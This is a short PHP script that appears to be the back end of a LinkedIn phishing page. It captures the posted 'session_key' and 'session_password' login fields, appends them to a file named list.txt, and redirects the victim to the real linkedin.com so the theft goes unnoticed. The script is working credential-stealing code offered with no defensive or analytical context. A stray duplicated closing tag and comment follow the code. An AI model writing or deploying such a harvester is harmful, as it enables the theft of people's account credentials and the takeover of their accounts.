<?php
Header('Location:https://www.linkedin.com');
$handle = fopen('list.txt' ,'a');


foreach($_POST as $variable => $value) {
    if($variable=='session_key' || $variable=='session_password'){
        
        fwrite($handle, $variable);
        fwrite($handle, '=');
        fwrite($handle, $value);
        fwrite($handle, "\n");
    }
}
fclose($handle);
exit;
?>?> # Marks the end of the PHP program.
